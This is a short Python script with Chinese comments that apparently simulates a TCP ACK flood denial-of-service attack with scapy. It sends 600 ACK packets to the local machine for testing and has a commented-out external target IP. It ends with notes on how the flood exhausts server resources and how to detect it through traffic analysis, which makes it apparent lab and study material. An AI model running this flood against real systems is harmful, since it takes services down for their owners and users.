# 模拟ACK Flood攻击, 发送大量ACK报文
# 12行指定了是发给Windows环境中的WLAN网口
# 19-22行设置发送给本机，端口2024，数量为600

from scapy.all import send, conf
from scapy.layers.inet import IP, TCP
from scapy.arch import get_if_addr

# 发送ACK,packet[TCP].flags=0x10
def ack_flood(target_ip, target_port, num_packets):
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags="A")
    send(packet * num_packets, verbose=0, iface="WLAN")


if __name__ == '__main__':
    # 调用函数执行ACK Flood攻击
    # target_ip = "10.12.168.125"
    # 自动获取本地IPv4地址, 测试阶段发给自己
    target_ip = get_if_addr(conf.iface)
    target_port = 2024
    num_packets = 600  # 指定要发送的ACK数据包数量
    ack_flood(target_ip, target_port, num_packets)


# ACK Flood发送大量的伪造的TCP ACK包给目标服务器，
# 这会导致服务器不得不处理大量的无效ACK包，从而消耗服务器的资源。
# 导致:CPU资源消耗/带宽消耗/连接资源耗尽/服务不可用


# 区分正常的ACK报文和ACK Flood的ACK报文通常需要进行流量分析和行为检测。虽然在TCP协议中，ACK报文本身并没有明确区分正常与异常的标志，但可以通过以下方式进行区分：
#
# 流量模式分析：正常的ACK报文在网络流量中通常会呈现一定的规律性和稳定性，而ACK Flood攻击所产生的大量ACK报文往往会在短时间内集中发送，导致网络流量突增。通过分析流量模式，可以发现异常的ACK报文发送行为。
#
# 源地址分析：正常的ACK报文通常来自于合法的客户端，具有真实有效的源地址和端口信息。而ACK Flood攻击中的ACK报文往往来自于大量伪造的源地址，具有随机化或重复性的特征。通过分析源地址的情况，可以识别出异常的ACK报文。
#
# 目的端口分析：正常的ACK报文通常会发送到合法的目标端口，而ACK Flood攻击中的ACK报文可能会发送到同一个目标端口，并集中攻击该端口。通过监控目的端口的数据流量，可以检测到异常的ACK报文。
#
# 频率和数量分析：正常的ACK报文发送频率和数量通常是受到应用程序和网络负载的限制的，而ACK Flood攻击中的ACK报文可能会以非常高的频率和数量发送。通过监控ACK报文的发送频率和数量，可以识别出异常的ACK Flood行为。
#
# 综合利用上述方法进行流量分析和行为检测，可以有效区分正常的ACK报文和ACK Flood的异常ACK报文，及时采取相应的防御措施保护网络安全。
